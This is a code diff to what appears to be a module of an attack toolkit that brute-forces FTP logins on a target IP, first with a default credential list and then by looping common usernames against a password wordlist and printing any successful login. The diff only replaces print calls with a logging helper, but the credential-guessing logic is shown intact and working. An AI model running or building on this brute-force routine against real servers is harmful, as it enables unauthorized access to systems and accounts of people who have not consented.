@@ -45,11 +45,11 @@ def execute(options):
     port = 21
     wordlist_path = options.get("PASS")
 
-    print(f"{C.HEADER}--- FTP BRUTE FORCE: {target_ip} ---")
+    smf.printf(f"{C.HEADER}--- FTP BRUTE FORCE: {target_ip} ---")
     try:
         for user, passwd in DEFAULT_CREDS:
             if test_ftp(target_ip, port, user, passwd):
-                print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
+                smf.printf(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
                 return
 
         if wordlist_path and os.path.exists(wordlist_path):
@@ -57,14 +57,14 @@ def execute(options):
                 password = [line.strip() for line in f if line.strip()]
 
                 for user in COMMON_USERS:
-                    print(f"{C.MENU}  [*] Testing user: {user}")
+                    smf.printf(f"{C.MENU}  [*] Testing user: {user}")
                     for pw in password:
                         if test_ftp(target_ip, port, user, pw):
-                            print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{pw}")
+                            smf.printf(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{pw}")
                             return
 
     except KeyboardInterrupt:
         return
     except Exception as e:
-        print("{C.ERROR}[x] ERROR: {e}")
+        smf.printf("{C.ERROR}[x] ERROR =>", e)
         return
